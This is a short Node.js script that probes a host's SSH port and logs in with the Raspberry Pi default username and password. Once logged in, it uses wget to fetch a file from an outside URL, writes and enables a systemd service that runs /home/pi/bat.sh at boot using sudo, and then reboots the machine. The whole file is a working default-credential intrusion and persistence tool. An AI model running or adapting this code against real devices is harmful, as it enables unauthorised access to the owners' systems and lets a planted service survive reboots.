var tcPing = require('tcp-ping');
var nodeSsh = require('node-ssh');
const ssh = new nodeSsh();

const passwords = [
    "raspberry",
    "password"
]
const ipAddress = "ip";


const attemptConnect = async () => {
    var live = await tcPing.probeAsync(ipAddress, 22);
    if (live) {
        const password = 'raspberry';
        console.log('port open', live)
        try {
            await ssh.connect({
                host: ipAddress,
                port: 22,
                username: 'pi',
                password: password
            });
            await ssh.execCommand('wget https://docs.ccsu.edu/Audit.pdf')
            await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/home/pi/bat.sh\n\n[Install]\nWantedBy=multi-user.target" > test.service');
            await ssh.execCommand('sudo mv test.service /etc/systemd/system');
            await ssh.execCommand('sudo systemctl daemon-reload');
            await ssh.execCommand('sudo systemctl enable test');
            await ssh.execCommand('sudo reboot now');

            ssh.dispose();
        } catch (ex) {
            ssh.dispose();
            console.log(ex);
        }
    }
}

attemptConnect();